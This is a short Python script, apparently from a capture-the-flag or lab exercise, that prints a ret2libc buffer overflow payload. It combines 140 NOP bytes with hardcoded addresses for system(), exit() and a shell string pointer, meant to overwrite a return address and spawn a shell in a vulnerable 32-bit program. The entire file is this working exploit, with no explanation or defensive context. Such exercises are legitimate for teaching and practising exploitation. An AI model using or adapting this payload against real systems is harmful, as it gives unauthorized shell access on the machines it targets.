import struct

pad = b"\x90"*140
system = struct.pack('I', 0xb7e6b060)
exit = struct.pack('I', 0xb7e5ebe0)
shell = struct.pack('I', 0xbffff946)

print(pad + system + exit + shell)
